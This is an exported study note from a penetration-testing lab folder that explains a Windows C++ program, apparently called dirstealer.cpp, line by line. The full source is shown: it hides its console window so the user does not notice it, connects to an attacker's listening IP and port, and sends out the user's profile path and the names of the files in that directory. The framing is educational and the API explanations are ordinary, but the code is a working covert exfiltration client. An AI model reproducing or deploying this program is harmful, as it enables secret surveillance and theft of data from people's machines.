<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>client socket(C++ program)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>client socket(C++ program)</h1><br/><h3>The c++ full code can be accessed </h3><a href="file:///CherryTree/screenshot/programming/C++/lab exploitation/dirstealer.cpp">HERE</a><br /><br /><div class="codebox"><div class="codebox">#define&nbsp;_WINSOCK_DEPRECATED_NO_WARNINGS</div></div><br />we used older functionalities of winsock utilities and we do not want the compiler to complain about this<br /><div class="codebox"><div class="codebox">#pragma&nbsp;comment<span style="color:#000000;font-weight:400">(</span>lib,&nbsp;&quot;Ws2_32.lib&quot;<span style="color:#000000;font-weight:400">)</span></div></div><br />tells the linker to add the &quot;Ws2_32.lib&quot; library to the list of library dependencies(remember that filenames are case-insensitive on typical Windows filesystems so &quot;ws2_32.lib&quot; is the same)<br />Some compilers, like Dev-C++  ignores #pragma directives so we have to the tell the compiler to add the Ws2_32.lib  when calling the linker on the command line with <strong>-lws2_32</strong>.<br />    We can do that on Tools→ Compiler Oprions<br />    <a href="file:///CherryTree/screenshot/programming/C++/lab exploitation/socket library.png"><img src="images/95-1.png" alt="images/95-1.png" /></a><br /><br /><div class="codebox"><div class="codebox">#include&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>iostream<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />standard input/output utilities<br /><div class="codebox"><div class="codebox">#include&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>winsock2.h<span style="color:#000000;font-weight:400">&gt;</span></div></div><br /> header file  that contains most of the Winsock functions, structures, and definitions<br /><div class="codebox"><div class="codebox">#include&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>stdio.h<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />standard input/output utilities<br /><div class="codebox"><div class="codebox">#include&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>stdlib.h<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />standard input/output utilities<br /><div class="codebox"><div class="codebox">#include&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>dirent.h<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />directory utilities<br /><div class="codebox"><div class="codebox">#include&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>string<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />string utilities<br /><br /><div class="codebox"><div class="codebox">char*&nbsp;userDirectory()<span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;char*&nbsp;pPath;<br />&nbsp;&nbsp;pPath&nbsp;=&nbsp;getenv&nbsp;(&quot;USERPROFILE&quot;);<br />&nbsp;&nbsp;if&nbsp;(pPath!=NULL){<br />&nbsp;&nbsp;&nbsp;&nbsp;//printf(&quot;%s\n&quot;,&nbsp;pPath);<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;pPath;<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;else{<br />&nbsp;&nbsp;&nbsp;&nbsp;perror(&quot;&quot;);<br />&nbsp;&nbsp;}<br /><span style="color:#000000;font-weight:400">}</span></div></div><br />• The <strong>getenv()</strong> function → char* getenv( const char* env_var );<br />    In C++ returns a pointer to a C string containing the value of the environment variable(e.g.:PATH, USERPROFILE...) passed as argument.<br />• The <strong>perror(&quot;&quot;)</strong> function → void perror ( const char * str );<br /> Interprets the value of errno as an error message, and prints it to stderr (the standard error output stream, usually the console). The <strong>str</strong> string (in our case “”) contain a custom message that is printed before the error message itself<br /><br /><strong><h2>main function</h2></strong><br /><div class="codebox"><div class="codebox">int&nbsp;main()<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;ShowWindow(GetConsoleWindow(),&nbsp;SW_HIDE);<br />&nbsp;&nbsp;&nbsp;&nbsp;WSADATA&nbsp;WSAData;<br />&nbsp;&nbsp;&nbsp;&nbsp;SOCKET&nbsp;client;&nbsp;//&nbsp;SOCKET&nbsp;is&nbsp;an&nbsp;int&nbsp;in&nbsp;fact&nbsp;we&nbsp;can&nbsp;also&nbsp;declare:&nbsp;int&nbsp;client;<br />&nbsp;&nbsp;&nbsp;&nbsp;SOCKADDR_IN&nbsp;addr;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;WSAStartup(MAKEWORD(2,&nbsp;0),&nbsp;&amp;WSAData);<br />&nbsp;&nbsp;&nbsp;&nbsp;client&nbsp;=&nbsp;socket(AF_INET,&nbsp;SOCK_STREAM,&nbsp;0);<br />&nbsp;&nbsp;&nbsp;&nbsp;addr.sin_addr.s_addr&nbsp;=&nbsp;inet_addr(&quot;172.16.160.3&quot;);&nbsp;//&nbsp;listening&nbsp;IP<br />&nbsp;&nbsp;&nbsp;&nbsp;addr.sin_family&nbsp;=&nbsp;AF_INET;<br />&nbsp;&nbsp;&nbsp;&nbsp;addr.sin_port&nbsp;=&nbsp;htons(5555);&nbsp;//listening&nbsp;port<br />&nbsp;&nbsp;&nbsp;&nbsp;connect(client,&nbsp;(SOCKADDR_IN&nbsp;*)&amp;addr,&nbsp;sizeof(addr));<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;//printf(&quot;conntected&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;char*&nbsp;pPath&nbsp;=&nbsp;userDirectory();<br />&nbsp;&nbsp;&nbsp;&nbsp;send(client,&nbsp;pPath,&nbsp;sizeof(pPath),&nbsp;0);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;DIR&nbsp;*dir;<br />&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;dirent&nbsp;*ent;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;((dir&nbsp;=&nbsp;opendir&nbsp;(pPath))&nbsp;!=&nbsp;NULL)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;print&nbsp;all&nbsp;the&nbsp;files&nbsp;and&nbsp;directories&nbsp;within&nbsp;directory&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;((ent&nbsp;=&nbsp;readdir&nbsp;(dir))&nbsp;!=&nbsp;NULL)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send(client,&nbsp;ent-&gt;d_name,&nbsp;sizeof(ent-&gt;d_name),&nbsp;0);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;closedir&nbsp;(dir);<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;could&nbsp;not&nbsp;open&nbsp;directory&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;perror&nbsp;(&quot;&quot;);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;////clean&nbsp;up<br />&nbsp;&nbsp;&nbsp;&nbsp;closesocket(client);<br />&nbsp;&nbsp;&nbsp;&nbsp;WSACleanup();<br />}</div></div><br />• <strong>ShowWindow(GetConsoleWindow(), SW_HIDE);</strong><br />   is used to hide the command window. we don&#39;t want that the user notice that the program has started<br />   If we want to show it we use: ShowWindow(::GetConsoleWindow(), SW_SHOW);<br />• <strong>WSAStartup(MAKEWORD(2, </strong><strong><span style="color:#ff0044;">0</span></strong><strong>), &amp;WSAData);</strong><br />   ◇ MAKEWORD function is used to specify the version of Winsock that we want to use( in our case 2.0), MAKEWORD is a function that create a concatenation of two 8 bit numbers(so in total 16bit),so in our case<br />       2(00000010)+0(00000000)= 0000001000000000<br />   ◇ &amp;WSAData is a pointer to the WSADATA data structure WSAData that is populated with Windows Sockets informations like the version that we have requested(2.0) and some other informations.<br />• <strong>client = socket(</strong><strong><span style="color:#00ff00;">AF_INET</span></strong><strong>, </strong><strong><span style="color:#ff8700;">SOCK_STREAM</span></strong><strong>, </strong><strong><span style="color:#ff0000;">0</span></strong><strong>);</strong><br />    This call results in a stream socket with TCP protocol providing the underlying communication<br />    the socket function → int socket(<span style="color:#00ff00;">int domain</span>, <span style="color:#ff8700;">int</span> <span style="color:#ff8700;">type</span>,<span style="color:#ff0000;"> int</span> <span style="color:#ff0000;">protocol</span>) <br />    creates a socket in the specified <span style="color:#00ff00;">domain</span> and of the specified<span style="color:#ff8700;"> type</span>. These are constants defined in sys/socket.h<br />    <span style="color:#00ff00;">domain</span>: AF_INET, AF_UNIX...<br />    <span style="color:#ff8700;">type</span>: SOCK_STREAM, SOCK_DGRAM...<br />    <span style="color:#ff0000;">protocol:</span> If the protocol is unspecified (value 0), the system selects a protocol that supports the <span style="color:#ff8700;">requested socket type</span>.<br />• <strong><span style="color:#a020f0;">sockaddr_in addr</span></strong> has this structure:<br />    <div class="codebox"><div class="codebox">#include&nbsp;&lt;netinet/in.h&gt;<br /><br />struct&nbsp;sockaddr_in&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sin_family;&nbsp;&nbsp;&nbsp;//&nbsp;e.g.&nbsp;AF_INET<br />&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;short&nbsp;&nbsp;&nbsp;sin_port;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;e.g.&nbsp;htons(5555)<br />&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;in_addr&nbsp;&nbsp;&nbsp;sin_addr;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;see&nbsp;struct&nbsp;in_addr,&nbsp;below<br />&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sin_zero[8];&nbsp;&nbsp;//&nbsp;zero&nbsp;this&nbsp;if&nbsp;you&nbsp;want&nbsp;to&nbsp;but&nbsp;not&nbsp;necessary<br />};<br /><br />struct&nbsp;in_addr&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;s_addr;&nbsp;&nbsp;//&nbsp;load&nbsp;with&nbsp;inet_aton()<br />};</div></div><br />     ◇ <strong><span style="color:#a020f0;">addr</span></strong><strong>.sin_family = AF_INET;<br />       </strong>we match the domain used in the socket call<br />     ◇<strong> </strong><strong><span style="color:#a020f0;">addr</span></strong><strong>.sin_port</strong><br />     short integer remote port number from host byte order(usually <span style="text-decoration:underline;">Little-endian</span>=opposite of Big-endian) to network byte order(<span style="text-decoration:underline;">Big-endian</span>=most significant byte first and the least significant byte last), <br />     converted using → unsigned short htons(unsigned short a);<br />     ◇ <strong><span style="color:#a020f0;">addr</span></strong><strong>.sin_addr.s_addr = inet_addr(&quot;172.16.160.3&quot;);</strong> <br />          The inet_addr(&quot;172.16.160.3&quot;) function→ in_addr_t inet_addr(const char *cp);<br />          converts a string  into a numeric IPv4 Internet address<br />          The IPv4 that we have inserted, is the IP of the attacking machine from where we are listening<br />          Anyway now this function is deprecate because doesn&#39;t support IPv6<br />• <strong>connect(</strong><strong><span style="color:#ffa500;">client</span></strong><strong>, (SOCKADDR *)&amp;</strong><strong><span style="color:#ffff00;">addr</span></strong><strong>, sizeof(addr));</strong><br />    this call connects the socket referred to by the file descriptor <span style="color:#ffa500;text-decoration:underline;">client</span> to the address specified by <em><span style="color:#ffff00;text-decoration:underline;">addr</span></em>, <br />    <span style="color:#ffff00;text-decoration:underline;">addr</span> is been converted from SOCKADDR_IN to SOCKADDR because the function connect() <br />    accept only that → int connect(int <span style="color:#ffa500;">socket</span>, struct sockaddr *<span style="color:#ffff00;">address</span>, socklen_t address_len);<br />• <strong>char* pPath = userDirectory(); </strong> <br />    new local variable pPath is declared and user’s directory is assigned to it<br />• <strong>send(client, pPath, sizeof(pPath),</strong><strong><span style="color:#ff00c5;"> 0</span></strong><strong>);<br /></strong>   ◇ The requested pPath is sent to the penetration tester on the previously set ip address and port.<br />   ◇ This is the format of the function →  ssize_t send(int sockfd, const void *buf, size_t len, int flags); <br />        The int flags setted to <span style="color:#ff00c5;">0</span> is the default behaviour and so is equivalent to the function write → <br />        ssize_t write(int fs, const void *buf, ssize_t N);<br />        But while send() is particularly used for sockets, write() can also be used for streams and memory objects.<br />   ◇ Difference <strong>size_t</strong> and <strong>ssize_t</strong>: size_t is used to return a size in bytes, while ssize_t to return a size in bytes or a (negative) error value. The first s in ssize_t means signed.<br />• <strong>opendir (pPath) →</strong> DIR *opendir(const char *dirname);<strong><br />    </strong>opendir() function returns a pointer to an object of type DIR so that it can be read with the readdir() function. Otherwise, a null pointer(NULL) is returned and errno is set to indicate the error.<br />    The type DIR, is defined in the header &lt;dirent.h&gt;, represents a directory stream, which is an ordered sequence of all the directory entries in a particular directory. <strong><br />• readdir(</strong><strong><span style="color:#00ff00;">dir</span></strong><strong>) →  </strong>struct dirent  * readdir(DIR *dirp); <br />    has this structure:<br />    <div class="codebox"><div class="codebox">struct&nbsp;dirent&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;ino_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d_ino;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;inode&nbsp;number&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;off_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d_off;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;offset&nbsp;to&nbsp;the&nbsp;next&nbsp;dirent&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;short&nbsp;d_reclen;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;length&nbsp;of&nbsp;this&nbsp;record&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;char&nbsp;&nbsp;d_type;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;type&nbsp;of&nbsp;file;&nbsp;not&nbsp;supported<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;by&nbsp;all&nbsp;file&nbsp;system&nbsp;types&nbsp;*/<br />&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d_name[256];&nbsp;/*&nbsp;filename&nbsp;*/<br />};</div></div><br />    The readdir() function  return a pointer to a structure representing the directory entry <span style="text-decoration:underline;">at the current position</span> in the <span style="color:#00ff00;">directory stream </span>specified by the argument dirp(<span style="color:#00ff00;">dir</span>), and position the directory stream <span style="text-decoration:underline;">at the next entry</span>. It shall return a null pointer upon reaching the end of the<span style="color:#00ff00;"> directory stream</span>.<br />• <strong>send(client, ent-&gt;d_name, </strong><strong><span style="color:#ff9d00;">sizeof</span></strong><strong>(ent-&gt;d_name), </strong><strong><span style="color:#ff0044;">0</span></strong><strong>);</strong><br />    ent-&gt;d_name is essentially a shorthand notation for (*ent).d_name,  ent-&gt;d_name is accessing the property d_name of the object that ent points to.<strong><br /></strong><br />    <strong><br /><br /><br /><br /><br /><br /></strong></div>
</body>
</html>
